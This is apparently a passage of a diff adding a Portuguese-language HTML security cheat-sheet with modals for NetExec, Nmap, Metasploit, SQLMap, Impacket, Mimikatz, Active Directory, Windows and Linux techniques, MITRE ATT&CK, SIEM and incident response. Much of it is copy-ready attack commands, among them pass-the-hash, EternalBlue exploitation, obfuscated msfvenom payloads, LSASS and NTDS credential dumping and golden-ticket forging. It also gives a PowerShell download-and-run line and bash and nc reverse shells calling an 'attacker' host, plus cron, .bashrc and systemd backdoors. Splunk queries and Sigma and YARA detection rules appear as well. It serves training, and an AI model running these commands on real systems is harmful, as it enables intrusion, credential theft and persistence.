+# Usar NTLM hash (sem senha)
+nxc smb 192.168.1.100 -u admin -H "aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e" -x "whoami"
+
+# Verificar risco
+nxc smb 192.168.1.100 -u admin -H <hash> --sam
+    </div>
+
+    <h3>Módulos</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Listar módulos
+nxc smb -L
+
+# Usar módulo (ex: Mimikatz)
+nxc smb 192.168.1.100 -u admin -p pass -M mimikatz
+    </div>
+
+    <div class="info-box">
+      <strong>💡 Diferença:</strong> NXC é mais rápido e moderno que CrackMapExec, com melhor handling de erros.
+    </div>
+  </div>
+</div>
+
+<!-- Nmap -->
+<div id="nmap" class="modal" onclick="if(event.target === this) closeModal('nmap')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('nmap')">✕</button>
+    <h2>🎯 Nmap</h2>
+    <p>Scanner de portas e detecção de serviços - ferramenta essencial de reconhecimento.</p>
+
+    <h3>Tipos de scans</h3>
+    <ul>
+      <li><strong>-sS (SYN):</strong> Stealth scan (rápido, recomendado)</li>
+      <li><strong>-sT (TCP):</strong> Full connection (lento, detectável)</li>
+      <li><strong>-sU (UDP):</strong> UDP scan</li>
+      <li><strong>-sA (ACK):</strong> Firewall mapping</li>
+      <li><strong>-Pn:</strong> Não fazer ping (assume host ativo)</li>
+    </ul>
+
+    <h3>Scans comuns</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Quick scan (top 1000 portas)
+nmap -F target.com
+
+# Scan rápido completo
+nmap -sS -Pn -p- target.com --min-rate 5000
+
+# Scan detalhado (versão + scripts)
+nmap -sV -sC -p- target.com
+
+# Agressivo (OS detection + scripts)
+nmap -A -p- target.com
+
+# Output em múltiplos formatos
+nmap -A -p- target.com -oA results
+    </div>
+
+    <h3>Evasão de IDS/IPS</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Fragmentação de pacotes
+nmap -f target.com
+
+# Decoys (misturar com IPs falsos)
+nmap -D RND:10 target.com
+
+# Espaçamento entre pacotes
+nmap --scan-delay 100ms target.com
+
+# Data padding
+nmap --data-length 100 target.com
+    </div>
+
+    <h3>Script NSE</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Rodar scripts de vulnerabilidades
+nmap --script=vuln target.com
+
+# Script específico
+nmap --script=smb-os-discovery target.com
+
+# Categor​ias: auth, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln
+    </div>
+
+    <div class="warning-box">
+      <strong>⚠️ Aviso:</strong> Alguns scripts são "intrusive" e podem disrupted serviços. Use com cuidado.
+    </div>
+  </div>
+</div>
+
+<!-- Metasploit -->
+<div id="metasploit" class="modal" onclick="if(event.target === this) closeModal('metasploit')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('metasploit')">✕</button>
+    <h2>⚙️ Metasploit</h2>
+    <p>Framework completo para exploitation e post-exploitation.</p>
+
+    <h3>Componentes</h3>
+    <ul>
+      <li><strong>Exploits:</strong> Código que explora vulnerabilidades</li>
+      <li><strong>Payloads:</strong> Código a executar após exploração</li>
+      <li><strong>Encoders:</strong> Ofuscar payload</li>
+      <li><strong>Listeners:</strong> Receber conexão reversa</li>
+    </ul>
+
+    <h3>Workflow básico</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Iniciar console
+msfconsole
+
+# Buscar exploit
+search exploit smb
+search type:exploit platform:windows privilege_escalation:true
+
+# Usar exploit
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.1
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+    </div>
+
+    <h3>Msfvenom (Gerador de payloads)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Gerar payload reversível
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe
+
+# Com obfuscação
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e shikata_ga_nai -i 5 -f exe -o payload.exe
+
+# Payload PowerShell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f powershell
+    </div>
+
+    <h3>Meterpreter (Payload interativo)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Após exploração com sucesso:
+meterpreter> help
+
+# Comandos úteis
+meterpreter> sysinfo
+meterpreter> getuid
+meterpreter> whoami
+meterpreter> hashdump            # Dump SAM
+meterpreter> run persistence     # Persistent backdoor
+meterpreter> run post/windows/gather/credentials
+    </div>
+  </div>
+</div>
+
+<!-- SQLMap -->
+<div id="sqlmap" class="modal" onclick="if(event.target === this) closeModal('sqlmap')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('sqlmap')">✕</button>
+    <h2>💾 SQLMap</h2>
+    <p>Ferramenta para automatizar detecção e exploração de SQL Injection.</p>
+
+    <h3>Tipos de SQL Injection detectados</h3>
+    <ul>
+      <li>Boolean-based blind</li>
+      <li>Time-based blind</li>
+      <li>Error-based</li>
+      <li>UNION-based</li>
+      <li>Stacked queries</li>
+    </ul>
+
+    <h3>Uso básico</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Auto-detect SQL injection
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Especificar ponto de injeção (*)
+sqlmap -u "http://target.com/page.php?id=1*"
+
+# Enumerate databases
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Dump table
+sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
+
+# Tentativas por diferentes técnicas
+sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
+    </div>
+
+    <h3>POST request</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Salvar POST request em arquivo
+# Burp → Copy to file → request.txt
+
+sqlmap -r request.txt --dbs
+
+# Ou inline
+sqlmap -u "http://target.com/login" --data="user=admin&pass=1*" --dbs
+    </div>
+
+    <h3>Crawl & Test</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Crawl site e testar todos URLs
+sqlmap -u "http://target.com" --crawl=2 --batch
+
+# Testar todas as formas
+sqlmap -u "http://target.com" --forms --batch
+    </div>
+
+    <h3>OS Shell</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Ganhar shell do SO (se DB pode executar system commands)
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+    </div>
+  </div>
+</div>
+
+<!-- Impacket -->
+<div id="impacket" class="modal" onclick="if(event.target === this) closeModal('impacket')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('impacket')">✕</button>
+    <h2>📦 Impacket</h2>
+    <p>Biblioteca Python com ferramentas de segurança para protocolos de rede (SMB, LDAP, Kerberos).</p>
+
+    <h3>Ferramentas principais</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+GetUserSPNs.py        # Kerberoasting
+GetNPUsers.py         # ASREPRoasting
+secretsdump.py        # Dump credenciais
+psexec.py             # Execução remota
+ticketer.py           # Forjar tickets Kerberos
+lookupsid.py          # Dump SIDs
+    </div>
+
+    <h3>Kerberoasting</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Pedir TGS (ticket) para contas de serviço
+python3 GetUserSPNs.py -request domain/user:pass
+
+# Crack hashes
+hashcat -m 13100 spn_hashes.txt wordlist.txt
+    </div>
+
+    <h3>ASREPRoasting</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Encontrar contas sem pré-auth Kerberos
+python3 GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+
+# Crack
+hashcat -m 18200 hashes.txt wordlist.txt
+    </div>
+
+    <h3>Dump de Credenciais via SMB</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# SAM + SYSTEM
+python3 secretsdump.py domain/user:pass@target
+
+# NTDS.dit (Domain Controller)
+python3 secretsdump.py -ntds-file ntds.dit -system-file system.hive local
+
+# Via VSS (Volume Shadow Copy)
+python3 secretsdump.py -vss domain/user:pass@dc
+    </div>
+
+    <h3>Psexec (Execução Remota)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Com senha
+python3 psexec.py domain/user:pass@target cmd
+
+# Com hash (Pass-the-Hash)
+python3 psexec.py domain/user@target -hashes aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e
+
+# Kerberos
+python3 psexec.py -k -no-pass domain/user@target
+    </div>
+
+    <h3>Ticketer (Forjar Golden Ticket)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Forjar ticket usando KRBTGT hash
+python3 ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> Administrator
+
+# Usar ticket
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass domain/administrator@target
+    </div>
+  </div>
+</div>
+
+<!-- Mimikatz -->
+<div id="mimikatz" class="modal" onclick="if(event.target === this) closeModal('mimikatz')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('mimikatz')">✕</button>
+    <h2>💀 Mimikatz</h2>
+    <p>Ferramenta de extração de credenciais em memória — essencial em pós-exploração Windows.</p>
+
+    <h3>Funcionalidades principais</h3>
+    <ul>
+      <li>Dump LSASS (credenciais em memória)</li>
+      <li>Pass-the-Hash/Pass-the-Ticket</li>
+      <li>Golden Ticket creation</li>
+      <li>DCSync (replicação DC)</li>
+      <li>Token impersonation</li>
+    </ul>
+
+    <h3>Setup</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Executar como admin
+mimikatz.exe
+
+# Permitir debug
+privilege::debug
+
+# Dump LSASS
+sekurlsa::logonpasswords
+    </div>
+
+    <h3>Dump de Credenciais</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+mimikatz > privilege::debug
+mimikatz > sekurlsa::logonpasswords
+
+# Saída contém:
+# NTLM hash
+# Plaintext password (se ainda em memória)
+# Kerberos tickets
+    </div>
+
+    <h3>SAM Dump (local)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+mimikatz > lsadump::sam
+# Extrai hashes de usuários locais
+    </div>
+
+    <h3>DCSync (Dump NTDS)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Replicar NTDS.dit do DC (requer permissão de replicação)
+mimikatz > lsadump::dcsync /domain:domain.com /user:krbtgt
+
+# Ou via secretsdump.py
+python3 secretsdump.py domain/admin:pass@dc -just-dc
+    </div>
+
+    <h3>Golden Ticket</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+mimikatz > kerberos::golden /user:Administrator /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /ticket:ticket.kirbi
+
+# Usar ticket
+mimikatz > kerberos::ppt ticket.kirbi
+# Agora acesso ao domínio como Administrator
+    </div>
+
+    <h3>Pass-the-Hash</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Injetar hash em sessão
+mimikatz > sekurlsa::pth /user:admin /domain:domain.com /ntlm:<hash>
+
+# Abre cmd.exe com credenciais do admin
+    </div>
+
+    <div class="warning-box">
+      <strong>⚠️ Detecção:</strong> Mimikatz dispara alertas de EDR ao:
+      - Usar privilege::debug
+      - Chamar sekurlsa:: (LSASS access)
+      - Fazer kerberos::golden
+    </div>
+  </div>
+</div>
+
+<!-- Active Directory -->
+<div id="ad" class="modal" onclick="if(event.target === this) closeModal('ad')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('ad')">✕</button>
+    <h2>📘 Active Directory</h2>
+    <p>Infraestrutura de autenticação e autorização em redes Windows corporativas.</p>
+
+    <h3>Componentes principais</h3>
+    <ul>
+      <li><strong>Domain Controller (DC):</strong> Gerencia usuários, grupos, políticas</li>
+      <li><strong>Users:</strong> Contas de domínio</li>
+      <li><strong>Groups:</strong> Agrupamentos de usuários/computadores</li>
+      <li><strong>Computers:</strong> Máquinas no domínio</li>
+      <li><strong>GPOs:</strong> Políticas aplicadas via Group Policy</li>
+    </ul>
+
+    <h3>Enumeration básica</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Listar usuários
+net user /domain
+Get-ADUser -Filter * | select Name,Enabled,PasswordLastSet
+
+# Listar grupos
+net group /domain
+Get-ADGroup -Filter * | select Name
+
+# Admin users
+net group "Domain Admins" /domain
+Get-ADUser -Filter {adminCount -eq 1}
+
+# Computadores
+Get-ADComputer -Filter * | select Name
+
+# Domain Controllers
+nltest /dclist:domain.com
+    </div>
+
+    <h3>Ataques comuns em AD</h3>
+    <ul>
+      <li><strong>Kerberoasting:</strong> Crack tickets de contas de serviço</li>
+      <li><strong>ASREPRoasting:</strong> Contas sem pré-auth</li>
+      <li><strong>Pass-the-Hash:</strong> Usar hashes ao invés de senhas</li>
+      <li><strong>Golden Ticket:</strong> Forjar tickets administrativos</li>
+      <li><strong>Constrained Delegation:</strong> Escalar privilégios via delegação</li>
+      <li><strong>GPO Abuse:</strong> Explorar políticas de grupo</li>
+    </ul>
+
+    <h3>BloodHound para mapeamento</h3>
+    <p>Use BloodHound para visualizar relacionamentos e encontrar paths de ataque até Domain Admin.</p>
+
+    <div class="info-box">
+      <strong>💡 Dica:</strong> AD é frequentemente o alvo principal em red teams corporativos — comprometer AD = comprometer a rede inteira.
+    </div>
+  </div>
+</div>
+
+<!-- Windows (Malicious & Detection) -->
+<div id="windows" class="modal" onclick="if(event.target === this) closeModal('windows')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('windows')">✕</button>
+    <h2>🪟 Windows — Ofensivo & Defensivo</h2>
+    <p>Técnicas maliciosas em Windows e como detectá-las.</p>
+
+    <h3>Técnicas ofensivas comuns</h3>
+
+    <h4>Execução de código</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# PowerShell
+powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+
+# CMD
+cmd.exe /c "for /l %i in (1,1,3) do @ping 127.0.0.1"
+
+# WMI
+wmic process call create "cmd.exe /c beacon.exe"
+
+# COM
+python3 -c "import win32com.client; o = win32com.client.GetObject('winmgmts:'); o.ExecMethod('Win32_Process', 'Create', 'notepad.exe')"
+    </div>
+
+    <h4>Persistence</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Registry RUN key
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d "C:\beacon.exe"
+
+# Scheduled Task
+schtasks /create /tn "Windows Update" /tr "C:\beacon.exe" /sc minute /mo 5
+
+# Service
+sc create Svchost binPath= "C:\beacon.exe"
+
+# WMI Event Subscription
+wmic /node:localhost /namespace:\\root\subscription path __EventFilter create Name="MyFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Perfos'"
+    </div>
+
+    <h3>Detecção de atividades maliciosas</h3>
+
+    <h4>Monitorar Processos</h4>
+    <ul>
+      <li><strong>PowerShell.exe -ep bypass:</strong> Bypass de execution policy</li>
+      <li><strong>cmd.exe /c:</strong> Execução silenciosa de comando</li>
+      <li><strong>wmic.exe:</strong> WMI execution (suspeito se sem contexto)</li>
+      <li><strong>msiexec.exe:</strong> MSI installation (LOLBin abuse)</li>
+      <li><strong>regsvcs.exe / InstallUtil.exe:</strong> .NET abuses</li>
+    </ul>
+
+    <h4>Monitorar Registry</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Alertar em changes em:
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+# Via PowerShell logging
+Get-EventLog -LogName "Windows PowerShell" -Newest 100
+    </div>
+
+    <h4>Monitorar Network</h4>
+    <ul>
+      <li>Conexões para IPs/domínios suspeitos</li>
+      <li>DNS queries com caracteres suspeitos</li>
+      <li>Tráfego HTTPS para CAs não confiáveis</li>
+    </ul>
+
+    <div class="warning-box">
+      <strong>⚠️ EDR Monitoring:</strong> Procurar: Unauthorized process creation, registry modification, DLL injection, LSASS access, non-admin user privilege escalation.
+    </div>
+  </div>
+</div>
+
+<!-- Linux (Malicious & Detection) -->
+<div id="linux" class="modal" onclick="if(event.target === this) closeModal('linux')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('linux')">✕</button>
+    <h2>🐧 Linux — Ofensivo & Defensivo</h2>
+    <p>Técnicas maliciosas em Linux e como detectá-las.</p>
+
+    <h3>Técnicas ofensivas comuns</h3>
+
+    <h4>Execução remota</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# SSH execution
+ssh user@target "whoami"
+
+# RDP-like (via SSH)
+ssh -D 9050 user@target
+
+# Reverse shell
+bash -i >& /dev/tcp/attacker/4444 0>&1
+nc -e /bin/bash attacker 4444
+    </div>
+
+    <h4>Persistence</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Cron backdoor
+echo "* * * * * /usr/bin/nc -e /bin/bash attacker 4444" | crontab -
+
+# Autorized_keys
+echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
+
+# .bashrc hook
+echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> ~/.bashrc
+
+# Systemd service
+echo "[Unit]
+Description=Backdoor
+[Service]
+ExecStart=/root/beacon
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
+    </div>
+
+    <h3>Detecção de atividades maliciosas</h3>
+
+    <h4>Monitorar Processos</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Processos com conexões de rede abertas
+netstat -tlnp
+lsof -i -P -n
+
+# Processos em execução
+ps aux | grep -v grep | grep -E "(nc|bash|perl|python)"
+    </div>
+
+    <h4>Monitorar Logs</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Auth log
+tail -f /var/log/auth.log
+grep "Failed password" /var/log/auth.log
+
+# Syslog
+tail -f /var/log/syslog
+
+# Comando history
+history
+cat ~/.bash_history
+    </div>
+
+    <h4>Monitorar Persistence</h4>
+    <ul>
+      <li><strong>Cron jobs:</strong> crontab -l, /etc/cron.d/</li>
+      <li><strong>SSH keys:</strong> ~/.ssh/authorized_keys</li>
+      <li><strong>Shell rc files:</strong> ~/.bashrc, ~/.zshrc, /etc/bashrc</li>
+      <li><strong>Systemd:</strong> /etc/systemd/system/</li>
+      <li><strong>Sudoers:</strong> /etc/sudoers, /etc/sudoers.d/</li>
+    </ul>
+
+    <h4>Monitorar Network</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Conexões abertas
+netstat -tulpn
+ss -tulpn
+
+# DNS queries
+cat /var/log/syslog | grep -i dns
+
+# Tráfego suspeito
+tcpdump -i eth0 -n "host attacker_ip"
+    </div>
+
+    <div class="info-box">
+      <strong>💡 Dica:</strong> Linux servers não têm EDR native — mais focado em log analysis e file integrity monitoring.
+    </div>
+  </div>
+</div>
+
+<!-- MITRE ATT&CK -->
+<div id="mitre-attack" class="modal" onclick="if(event.target === this) closeModal('mitre-attack')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('mitre-attack')">✕</button>
+    <h2>🎯 MITRE ATT&CK</h2>
+    <p>Framework que documenta técnicas de adversários conhecidas e comprovadas.</p>
+
+    <h3>O que é</h3>
+    <p>MITRE ATT&CK é uma base de conhecimento curada com técnicas, tácticas e procedimentos (TTPs) usados por adversários reais contra organizações.</p>
+
+    <h3>Estrutura</h3>
+    <ul>
+      <li><strong>Tactics:</strong> Objetivo do adversário (ex: Initial Access, Privilege Escalation)</li>
+      <li><strong>Techniques:</strong> Como executar a tática (ex: T1566 Phishing)</li>
+      <li><strong>Sub-techniques:</strong> Variação específica (ex: T1566.001 Spearphishing Attachment)</li>
+      <li><strong>Procedures:</strong> Implementação específica por malware</li>
+    </ul>
+
+    <h3>Tácticas principais</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+TA0001 - Initial Access (entrada)
+TA0002 - Execution (executar código)
+TA0003 - Persistence (manter acesso)
+TA0004 - Privilege Escalation (aumentar privilégios)
+TA0005 - Defense Evasion (evitar defesa)
+TA0006 - Credential Access (roubar credenciais)
+TA0007 - Discovery (reconhecimento interno)
+TA0008 - Lateral Movement (mover entre sistemas)
+TA0009 - Collection (coletar dados)
+TA0010 - Exfiltration (roubar dados)
+TA0011 - Command and Control (comunicação)
+TA0040 - Impact (impacto)
+    </div>
+
+    <h3>Exemplo: Técnica T1110 (Brute Force)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+ID: T1110
+Name: Brute Force
+Tactic: TA0006 (Credential Access)
+Sub-techniques:
+  - T1110.001: Password Guessing
+  - T1110.002: Password Spraying
+  - T1110.003: Password Cracking
+  - T1110.004: Credential Stuffing
+
+Detections:
+  - Multiple failed login attempts
+  - Unusual login patterns
+    </div>
+
+    <h3>Como usar no Red Team</h3>
+    <ol>
+      <li>Planejar operação usando MITRE ATT&CK</li>
+      <li>Mapear cada técnica usada (T1XXX)</li>
+      <li>Documentar no relatório</li>
+      <li>Ajudar defesa a entender ataque via MITRE IDs</li>
+    </ol>
+
+    <h3>Recursos</h3>
+    <p><a href="https://attack.mitre.org" target="_blank">https://attack.mitre.org</a></p>
+  </div>
+</div>
+
+<!-- TTPs -->
+<div id="ttps" class="modal" onclick="if(event.target === this) closeModal('ttps')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('ttps')">✕</button>
+    <h2>📋 TTPs (Tactics, Techniques, Procedures)</h2>
+    <p>Padrão de comportamento de um adversário.</p>
+
+    <h3>Definições</h3>
+    <ul>
+      <li><strong>Tactics:</strong> Objetivos de alto nível (MITRE ATT&CK Tactics)</li>
+      <li><strong>Techniques:</strong> Como alcançar cada objetivo (MITRE ATT&CK Techniques)</li>
+      <li><strong>Procedures:</strong> Implementação específica (ex: qual ferramenta, qual comando)</li>
+    </ul>
+
+    <h3>Exemplo: APT1 (Comment Crew)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+Tactic: Initial Access (TA0001)
+  Technique: Spearphishing (T1566)
+  Procedure: Enviar email malicioso com anexo Office
+
+Tactic: Execution (TA0002)
+  Technique: User Execution (T1204)
+  Procedure: Vítima abre anexo, macro executa
+
+Tactic: Privilege Escalation (TA0004)
+  Technique: Kernel Exploit (T1548.001)
+  Procedure: Usar CVE-2009-2846 (Windows)
+
+Tactic: Lateral Movement (TA0008)
+  Technique: Pass-the-Hash (T1550.002)
+  Procedure: Usar credentials roubadas com psexec
+    </div>
+
+    <h3>Documentar TTPs no Red Team</h3>
+    <p>Sempre mapear operações a MITRE ATT&CK para facilitar análise defensiva.</p>
+
+    <div class="info-box">
+      <strong>💡 Prioridade defensiva:</strong> TTPs comuns (Phishing, Pass-the-Hash) devem ter detecção específica.
+    </div>
+  </div>
+</div>
+
+<!-- SIEM / Log Analysis -->
+<div id="siem" class="modal" onclick="if(event.target === this) closeModal('siem')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('siem')">✕</button>
+    <h2>📊 SIEM / Log Analysis</h2>
+    <p>Coleta e análise centralizada de logs para detecção de ameaças.</p>
+
+    <h3>SIEMs comuns</h3>
+    <ul>
+      <li><strong>Splunk:</strong> Líder em mercado (caro)</li>
+      <li><strong>ELK Stack:</strong> Open-source (Elasticsearch, Logstash, Kibana)</li>
+      <li><strong>ArcSight:</strong> HPE</li>
+      <li><strong>QRadar:</strong> IBM</li>
+    </ul>
+
+    <h3>ELK Stack básico</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Iniciar containers
+docker-compose up -d
+
+# Elastic API
+curl -X GET "localhost:9200/_search" -H 'Content-Type: application/json' -d'
+{
+  "query": {
+    "match_all": {}
+  }
+}
+'
+
+# Kibana UI
+http://localhost:5601
+    </div>
+
+    <h3>Splunk queries</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Eventos de falha de autenticação
+index=windows EventCode=4625 | stats count by Account_Name
+
+# PowerShell suspeito
+index=windows sourcetype="WinEventLog:PowerShell" (IEX OR DownloadString OR WebClient)
+
+# Lateral movement (PsExec)
+index=windows EventCode=7045 ImagePath="*\\psexec.exe*"
+
+# Criação de novo usuário
+index=windows EventCode=4720
+
+# Dump LSASS
+index=windows EventCode=4688 process_name=*procdump* parent_process=cmd.exe
+    </div>
+
+    <h3>Correlação de eventos</h3>
+    <ul>
+      <li>Combinar múltiplos indicadores para aumentar confiança</li>
+      <li>Ex: Falha auth + criação de processo anormal + novo usuário = suspeita</li>
+    </ul>
+
+    <div class="info-box">
+      <strong>💡 Dica:</strong> SIEM é base de Threat Detection — logs são evidência de ataque.
+    </div>
+  </div>
+</div>
+
+<!-- Incident Response -->
+<div id="incident-response" class="modal" onclick="if(event.target === this) closeModal('incident-response')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('incident-response')">✕</button>
+    <h2>🚨 Incident Response</h2>
+    <p>Processo de responder e investigar incidentes de segurança.</p>
+
+    <h3>Fases do IR</h3>
+    <ol>
+      <li><strong>Preparação:</strong> Setup ferramentas, treino, planos</li>
+      <li><strong>Detecção & Análise:</strong> Identificar incidente, analisar</li>
+      <li><strong>Contenção:</strong> Parar spread, isolar sistemas</li>
+      <li><strong>Eradicação:</strong> Remover ameaça, patch vulnerabilidades</li>
+      <li><strong>Recuperação:</strong> Restaurar sistemas</li>
+      <li><strong>Post-Incident:</strong> Lições aprendidas, melhorias</li>
+    </ol>
+
+    <h3>Ferramentas de Forensics</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Memory dump
+procdump -accepteula -ma lsass.exe lsass.dmp
+
+# Análise de memória
+volatility -f memory.dump imageinfo
+volatility -f memory.dump pslist
+volatility -f memory.dump psxview
+
+# Disk image
+dd if=/dev/sda of=/mnt/backup/disk.img bs=4M
+
+# File integrity
+find / -type f -exec md5sum {} \; > baseline.md5
+    </div>
+
+    <h3>Timeline de incidente</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+2024-01-15 10:00 - Alert: Brute force attempt (500 falhas)
+2024-01-15 10:05 - Análise: Source IP 192.168.1.100
+2024-01-15 10:10 - Containment: Bloquear IP no firewall
+2024-01-15 10:15 - Investigation: Verificar histórico do host
+2024-01-15 11:00 - Discovery: Malware encontrado em C:\Windows\System32
+2024-01-15 12:00 - Eradication: Remover malware, atualizar AV
+2024-01-15 14:00 - Recovery: Reiniciar sistemas
+2024-01-16 10:00 - Post-mortem: Lessons learned meeting
+    </div>
+
+    <h3>Comunicação durante incidente</h3>
+    <ul>
+      <li>Manter stakeholders informados</li>
+      <li>Escalação clara para executivos</li>
+      <li>Não prejudicar investigação</li>
+    </ul>
+  </div>
+</div>
+
+<!-- Threat Detection -->
+<div id="threat-detection" class="modal" onclick="if(event.target === this) closeModal('threat-detection')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('threat-detection')">✕</button>
+    <h2>🔴 Threat Detection</h2>
+    <p>Capacidade de identificar atividades maliciosas em tempo real ou análise retrospectiva.</p>
+
+    <h3>Tipos de detecção</h3>
+    <ul>
+      <li><strong>Signature-based:</strong> Pattern matching conhecido</li>
+      <li><strong>Anomaly-based:</strong> Desvio do comportamento normal</li>
+      <li><strong>Behavioral:</strong> Análise de cadeia de atividades</li>
+    </ul>
+
+    <h3>Indicadores de ataque (IoCs)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+IP malicioso
+Domain C2
+Hash de malware
+Assinatura de arquivo
+String de URL
+    </div>
+
+    <h3>Sigma rules (genéricas)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+title: PowerShell execution from temp
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - 'AppData\Local\Temp'
+      - 'Downloads'
+  condition: selection
+    </div>
+
+    <h3>YARA rules (malware)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+rule MalwareExample {
+  strings:
+    $s1 = "cmd.exe /c" wide
+    $s2 = "powershell.exe -ep bypass" wide
+    $hex = { 4D 5A 90 00 }  // MZ header
+  condition:
+    all of them
+}
+    </div>
+
+    <h3>Detection tuning (reduzir falsos positivos)</h3>
+    <ol>
+      <li>Baseline comportamento normal</li>
+      <li>Whitelist sistemas legítimos</li>
+      <li>Correlação com múltiplos eventos</li>
+      <li>Severidade baseada em contexto</li>
+    </ol>
+  </div>
+</div>
+
+<!-- Detection Rule Tuning -->
+<div id="detection-tuning" class="modal" onclick="if(event.target === this) closeModal('detection-tuning')">
+  <div class="modal-content">
